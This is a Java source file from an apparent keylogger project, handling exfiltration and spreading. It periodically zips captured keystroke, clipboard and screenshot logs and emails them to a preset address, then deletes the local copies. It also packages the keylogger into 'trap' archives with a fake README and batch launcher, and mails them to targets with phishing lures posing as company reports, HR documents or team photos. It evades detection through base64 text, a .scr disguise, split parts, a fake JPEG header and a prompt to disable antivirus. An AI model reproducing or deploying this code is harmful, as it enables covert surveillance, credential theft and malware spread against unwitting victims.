import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.*;

import java.io.*;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Objects;
import java.util.Properties;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

class EmailSender {
    private static final String SENDER_EMAIL = "your-email@gmail.com"; //email người gửi
    private static final String APP_PASSWORD = "your-app-password"; //app password
    private static final String RECIPIENT_EMAIL = "recipient@gmail.com"; //email người nhận

    public static void sendEmailWithAttachment(String subject, String content, File attachment) {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        Session session = Session.getInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(SENDER_EMAIL, APP_PASSWORD);
            }
        });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(SENDER_EMAIL));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(RECIPIENT_EMAIL));
            message.setSubject(subject);

            MimeBodyPart textPart = new MimeBodyPart();
            textPart.setText(content);

            MimeBodyPart attachmentPart = new MimeBodyPart();
            try (FileInputStream fis = new FileInputStream(attachment)){
                DataSource source = new FileDataSource(attachment);
                attachmentPart.setDataHandler(new DataHandler(source));
                attachmentPart.setFileName(attachment.getName());
                Multipart multipart = new MimeMultipart();
                multipart.addBodyPart(textPart);
                multipart.addBodyPart(attachmentPart);

                message.setContent(multipart);
                Transport.send(message);
                System.out.println("Email sent successfully.");
            }
        } catch (MessagingException | IOException e) {
            e.printStackTrace();
        }
    }

    private static long getFolderSize(File folder) {
        if (!folder.exists()) return 0;
        return Arrays.stream(Objects.requireNonNull(folder.listFiles()))
                .mapToLong(file -> file.isFile() ? file.length() : getFolderSize(file))
                .sum();
    }

    private static File zipFolderToTemp(String folderPath) throws IOException {
        String timestamp = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss").format(new Date());
        String zipFileName = LogFileHandler.TEMP_FOLDER_PATH + File.separator + "JKeyData_" + timestamp + ".zip";
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFileName))) {
            File folder = new File(folderPath);
            for (File file : Objects.requireNonNull(folder.listFiles())) {
                if (file.isFile()) {
                    try (FileInputStream fis = new FileInputStream(file)) {
                        ZipEntry zipEntry = new ZipEntry(file.getName());
                        zos.putNextEntry(zipEntry);

                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = fis.read(buffer)) > 0) {
                            zos.write(buffer, 0, length);
                        }
                        zos.closeEntry();
                    }
                }
            }
        }
        return new File(zipFileName);
    }

    private static void deleteFolderContents(File folder) {
        for (File file : Objects.requireNonNull(folder.listFiles())) {
            if (file.isFile()) {
                file.delete();
            } else {
                deleteFolderContents(file);
                file.delete();
            }
        }
    }

    public static void sendFileAfterTime(long interval, String subject, String content) {
        new Thread(() -> {
            try {
                while (true) {
                    Thread.sleep(interval);
                    File zipFile = zipFolderToTemp(LogFileHandler.LOG_FOLDER_PATH);
                    sendEmailWithAttachment(subject, content, zipFile);
                    deleteFolderContents(new File(LogFileHandler.LOG_FOLDER_PATH));
                    zipFile.delete();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void monitorAndSend(long MAX_FOLDER_SIZE_MB, String subject, String content) {
        new Thread(() -> {
            while (true) {
                try {
                    long folderSizeMB = getFolderSize(new File(LogFileHandler.LOG_FOLDER_PATH)) / (1024 * 1024);
                    if (folderSizeMB >= MAX_FOLDER_SIZE_MB) {
                        File zipFile = zipFolderToTemp(LogFileHandler.LOG_FOLDER_PATH);
                        sendEmailWithAttachment(subject, content, zipFile);
                        deleteFolderContents(new File(LogFileHandler.LOG_FOLDER_PATH));
                        zipFile.delete();
                    }
                    Thread.sleep(60000); // Kiểm tra mỗi 60 giây
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    // Feature to send trap file for spreading KeyLogger
    public static void sendTrapFile(String[] emailList, String subject, String content) {
        new Thread(() -> {
            try {
                // Tạo file ZIP từ các file .class hiện có
                File trapFile = createTrapJar();
                
                System.out.println("Created trap file: " + trapFile.getName() + " (" + trapFile.length() + " bytes)");
                
                for (String email : emailList) {
                    System.out.println("Preparing to send to: " + email);
                    sendTrapEmail(email, subject, content, trapFile);
                    Thread.sleep(3000); // Delay 3s between emails to avoid spam filter
                }
                
                System.out.println("Completed sending trap file to " + emailList.length + " target(s)");
                
                // Delete temp file after sending
                if (trapFile.exists()) {
                    trapFile.delete();
                    System.out.println("Deleted temporary trap file");
                }
                
            } catch (Exception e) {
                System.err.println("Error during trap file sending process: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }
    
    // Method backup: Gửi qua Google Drive link thay vì attachment
    public static void sendTrapViaLink() {
        String[] targets = {"your-email@gmail.com"}; //danh sách email nhận link
        String subject = "Important Document Sharing - 48h Deadline";
        String content = "Hello,\n\n" +
                "I have uploaded the Q4/2024 document package to Google Drive as the file is too large for email.\n\n" +
                "Download link:\n" +
                "https://drive.google.com/file/d/1xYz9AbC3dEf7GhI2jKl4MnO5pQr6StU8/view\n" + //link giả
                "Extraction password: company2024\n\n" +
                "Important notes:\n" +
                "- Link will automatically expire after 48 hours\n" +
                "- File is encrypted, only runs on Windows\n" +
                "- After download, run Setup.exe with Admin privileges\n\n" +
                "Package contents:\n" +
                "- Q4 Financial Report\n" +
                "- HR Plan 2025\n" +
                "- New Data Analysis Tool\n\n" +
                "Please confirm receipt and complete review before 08/11.\n\n" +
                "Best regards,\n" +
                "John Smith\n" +
                "HR Department - IT Support\n" +
                "support@company.com | Phone: 024.1234.5678";
        
        for (String email : targets) {
            try {
                // Create small text file as "guide"
                String txtPath = System.getProperty("java.io.tmpdir") + File.separator + "Download_Guide.txt";
                File guideFile = new File(txtPath);
                
                try (FileWriter writer = new FileWriter(guideFile)) {
                    writer.write("DOCUMENT DOWNLOAD GUIDE\n");
                    writer.write("=======================\n\n");
                    writer.write("1. Click the link in the email\n");
                    writer.write("2. Login to Google Drive\n");
                    writer.write("3. Download CompanyDocs.zip file\n");
                    writer.write("4. Extract with password: company2024\n");
                    writer.write("5. Run Setup.exe with Administrator privileges\n\n");
                    writer.write("Warning: Temporarily disable antivirus if file is blocked\n");
                    writer.write("Contact IT: 024.1234.5678\n");
                }
                
                sendTrapEmail(email, subject, content, guideFile);
                guideFile.delete();
                System.out.println("Successfully sent link trap to: " + email);
                
            } catch (Exception e) {
                System.err.println("Error sending link trap: " + e.getMessage());
            }
        }
    }

    private static File createTrapJar() throws Exception {
        String jarPath = System.getProperty("java.io.tmpdir") + File.separator + "Document_Report.zip";
        File jarFile = new File(jarPath);
        
        // Tạo ZIP file thay vì JAR để bypass detection
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(jarFile))) {
            // Thêm các file .class cần thiết
            addClassToJar(zos, "Keylogger.class");
            addClassToJar(zos, "KeyListenerHandler.class");
            addClassToJar(zos, "EmailSender.class");
            addClassToJar(zos, "EmailSender$1.class");
            addClassToJar(zos, "ClipboardMonitor.class");
            addClassToJar(zos, "WindowMonitor.class");
            addClassToJar(zos, "ScreenshotHandler.class");
            addClassToJar(zos, "ScreenshotHandler$1.class");
            addClassToJar(zos, "LogFileHandler.class");
            
            // Thêm thư viện cần thiết
            addLibToJar(zos, "jnativehook-2.2.2.jar");
            addLibToJar(zos, "javax.mail.jar");
            addLibToJar(zos, "javax.activation.jar");
            addLibToJar(zos, "jna-5.16.0.jar");
            addLibToJar(zos, "jna-platform-5.16.0.jar");
            
            // Thêm DLL file
            addDllToJar(zos, "JNativeHook-2.2.2.x86_64.dll");
            
            // Tạo batch file để chạy
            ZipEntry batEntry = new ZipEntry("Run_Application.bat");
            zos.putNextEntry(batEntry);
            String batContent = "@echo off\n" +
                    "echo Installing required components...\n" +
                    "java -cp \".;*.jar\" Keylogger\n" +
                    "pause\n";
            zos.write(batContent.getBytes());
            zos.closeEntry();
            
            // Thêm README giả để trông hợp pháp
            ZipEntry readmeEntry = new ZipEntry("README.txt");
            zos.putNextEntry(readmeEntry);
            String readme = "Company Document Package\n" +
                    "========================\n" +
                    "This package contains important company documents.\n" +
                    "To extract files, run Run_Application.bat\n" +
                    "\n" +
                    "Contact IT Support if you have any issues.\n";
            zos.write(readme.getBytes());
            zos.closeEntry();
        }
        
        return jarFile;
    }

    private static void addClassToJar(ZipOutputStream zos, String className) throws Exception {
        String classPath = "src" + File.separator + className;
        File classFile = new File(classPath);
        if (classFile.exists()) {
            ZipEntry entry = new ZipEntry(className);
            zos.putNextEntry(entry);
            try (FileInputStream fis = new FileInputStream(classFile)) {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, length);
                }
            }
            zos.closeEntry();
        }
    }

    private static void addLibToJar(ZipOutputStream zos, String libName) throws Exception {
        String libPath = "libs" + File.separator + libName;
        File libFile = new File(libPath);
        if (libFile.exists()) {
            ZipEntry entry = new ZipEntry("libs/" + libName);
            zos.putNextEntry(entry);
            try (FileInputStream fis = new FileInputStream(libFile)) {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, length);
                }
            }
            zos.closeEntry();
        }
    }

    private static void addDllToJar(ZipOutputStream zos, String dllName) throws Exception {
        String dllPath = "libs" + File.separator + dllName;
        File dllFile = new File(dllPath);
        if (dllFile.exists()) {
            ZipEntry entry = new ZipEntry(dllName);
            zos.putNextEntry(entry);
            try (FileInputStream fis = new FileInputStream(dllFile)) {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, length);
                }
            }
            zos.closeEntry();
        }
    }

    private static void sendTrapEmail(String toEmail, String subject, String content, File attachment) {
        System.out.println("Sending trap file to: " + toEmail);
        
        // Use existing sendEmailWithAttachment method
        try {
            sendEmailWithAttachment(subject, content, attachment);
            System.out.println("Successfully sent trap file to: " + toEmail);
        } catch (Exception e) {
            System.err.println("Error sending trap file: " + e.getMessage());
        }
    }

    // Method tiện ích để gửi file bẫy với template có sẵn
    public static void sendTrapToTargets() {
        String[] targets = {
            "your-email@gmail.com" //danh sách email nhận file bẫy
        };
        
        String subject = "Monthly Report November 2024 - Confirmation Required";
        String content = "Hello,\n\n" +
                "This is the November 2024 activity summary report that requires your review.\n" +
                "Please download the attached file and confirm the information.\n\n" +
                "File information:\n" +
                "- Name: Document_Report.zip\n" +
                "- Size: ~2MB\n" +
                "- Run Run_Application.bat file to view the report\n\n" +
                "Note: This file only works on Windows with Java installed.\n" +
                "Confirmation deadline: 08/11/2024\n\n" +
                "Best regards,\n" +
                "Accounting & Finance Department\n" +
                "ABC Company Ltd.";
        
        sendTrapFile(targets, subject, content);
    }
    
    // Method bypass: Tạo file .txt chứa base64 encoded của JAR
    public static void sendTrapAsText() {
        try {
            // Tạo file JAR
            File jarFile = createTrapJar();
            
            // Convert to base64
            byte[] jarBytes = java.nio.file.Files.readAllBytes(jarFile.toPath());
            String base64Content = java.util.Base64.getEncoder().encodeToString(jarBytes);
            
            // Tạo file .txt chứa base64
            String txtPath = System.getProperty("java.io.tmpdir") + File.separator + "instructions.txt";
            File txtFile = new File(txtPath);
            
            try (FileWriter writer = new FileWriter(txtFile)) {
                writer.write("COMPANY CONFIDENTIAL DOCUMENT\n");
                writer.write("=============================\n\n");
                writer.write("Installation Instructions:\n");
                writer.write("1. Copy the code below\n");
                writer.write("2. Save as 'setup.jar.b64'\n");
                writer.write("3. Use online base64 decoder to convert to .jar file\n");
                writer.write("4. Run the .jar file\n\n");
                writer.write("ENCODED DATA:\n");
                writer.write("=============\n");
                writer.write(base64Content);
            }
            
            // Gửi file .txt thay vì .jar
            String[] targets = {"your-email@gmail.com"}; //danh sách email nhận file bẫy
            String subject = "Company Software Installation Guide";
            String content = "Hello,\n\n" +
                    "This is the installation guide for the new company software.\n" +
                    "Please follow the instructions in the attached file.\n\n" +
                    "Attached file: instructions.txt\n\n" +
                    "Contact IT if you need support.\n\n" +
                    "Best regards,\n" +
                    "IT Department";
            
            for (String email : targets) {
                sendTrapEmail(email, subject, content, txtFile);
            }
            
            // Cleanup
            jarFile.delete();
            txtFile.delete();
            
        } catch (Exception e) {
            System.err.println("Error creating text trap file: " + e.getMessage());
        }
    }
    
    // Method 4: Tạo file .scr (screensaver) để bypass
    public static void sendTrapAsScreensaver() {
        try {
            // Tạo file JAR
            File jarFile = createTrapJar();
            
            // Rename to .scr (Windows screensaver)
            String scrPath = System.getProperty("java.io.tmpdir") + File.separator + "Company_Slideshow.scr";
            File scrFile = new File(scrPath);
            
            // Copy JAR content to .scr file
            try (FileInputStream fis = new FileInputStream(jarFile);
                 FileOutputStream fos = new FileOutputStream(scrFile)) {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    fos.write(buffer, 0, length);
                }
            }
            
            String[] targets = {"your-email@gmail.com"}; //danh sách email nhận file bẫy
            String subject = "New Product Slideshow Presentation";
            String content = "Hello,\n\n" +
                    "This is the slideshow presentation for our new product.\n" +
                    "Double-click the file to view the presentation.\n\n" +
                    "Attached file: Company_Slideshow.scr\n" +
                    "Duration: ~15 minutes\n" +
                    "Requirements: Windows 10/11\n\n" +
                    "Please review and provide feedback before 10/11.\n\n" +
                    "Best regards,\n" +
                    "Marketing Department\n" +
                    "marketing@company.com";
            
            for (String email : targets) {
                sendTrapEmail(email, subject, content, scrFile);
            }
            
            // Cleanup
            jarFile.delete();
            scrFile.delete();
            System.out.println("Successfully sent .scr trap file");
            
        } catch (Exception e) {
            System.err.println("Error creating .scr trap file: " + e.getMessage());
        }
    }
    
    // Method 5: Multiple small files để tránh detection
    public static void sendTrapInParts() {
        try {
            File jarFile = createTrapJar();
            byte[] jarData = java.nio.file.Files.readAllBytes(jarFile.toPath());
            
            // Split file into small parts
            int partSize = 1024 * 1024; // 1MB mỗi phần
            int numParts = (jarData.length + partSize - 1) / partSize;

            String[] targets = {"your-email@gmail.com"}; //danh sách email nhận file bẫy

            for (int i = 0; i < numParts; i++) {
                int start = i * partSize;
                int end = Math.min(start + partSize, jarData.length);
                byte[] partData = java.util.Arrays.copyOfRange(jarData, start, end);
                
                // Tạo file part
                String partPath = System.getProperty("java.io.tmpdir") + File.separator + "document_part" + (i+1) + ".dat";
                File partFile = new File(partPath);
                
                try (FileOutputStream fos = new FileOutputStream(partFile)) {
                    fos.write(partData);
                }
                
                String subject = "Document Part " + (i+1) + "/" + numParts + " - Important";
                String content = "This is part " + (i+1) + " of " + numParts + " document parts.\n\n" +
                        "After receiving all parts, please:\n" +
                        "1. Merge all .dat files in order\n" +
                        "2. Rename to document.zip\n" +
                        "3. Extract and run\n\n" +
                        "Part " + (i+1) + "/" + numParts;
                
                for (String email : targets) {
                    sendTrapEmail(email, subject, content, partFile);
                    Thread.sleep(2000); // Delay giữa các phần
                }
                
                partFile.delete();
            }
            
            jarFile.delete();
            System.out.println("Successfully sent " + numParts + " trap file parts");
            
        } catch (Exception e) {
            System.err.println("Error sending file in parts: " + e.getMessage());
        }
    }
    
    // Method 6: Steganography - Ẩn trong ảnh
    public static void sendTrapInImage() {
        try {
            File jarFile = createTrapJar();
            
            // Tạo file ảnh giả (thực tế chứa JAR data)
            String imgPath = System.getProperty("java.io.tmpdir") + File.separator + "company_team.jpg";
            File imgFile = new File(imgPath);
            
            try (FileOutputStream fos = new FileOutputStream(imgFile)) {
                // Thêm JPEG header giả
                byte[] jpegHeader = {
                    (byte)0xFF, (byte)0xD8, (byte)0xFF, (byte)0xE0, 
                    0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01
                };
                fos.write(jpegHeader);
                
                // Thêm JAR data
                byte[] jarData = java.nio.file.Files.readAllBytes(jarFile.toPath());
                fos.write(jarData);
                
                // Thêm JPEG footer
                byte[] jpegFooter = {(byte)0xFF, (byte)0xD9};
                fos.write(jpegFooter);
            }

            String[] targets = {"your-email@gmail.com"}; //danh sách email nhận file bẫy
            String subject = "Q4 2024 Team Building Photos";
            String content = "Hello,\n\n" +
                    "This is the photo album from our recent team building event.\n" +
                    "Many beautiful moments captured!\n\n" +
                    "File: company_team.jpg\n" +
                    "Date taken: 02/11/2024\n" +
                    "Participants: All employees\n\n" +
                    "Note: File may require special tool to view due to high resolution.\n\n" +
                    "Best regards,\n" +
                    "Administration Department";
            
            for (String email : targets) {
                sendTrapEmail(email, subject, content, imgFile);
            }
            
            // Cleanup
            jarFile.delete();
            imgFile.delete();
            System.out.println("Successfully sent image trap file");
            
        } catch (Exception e) {
            System.err.println("Error creating image trap file: " + e.getMessage());
        }
    }
}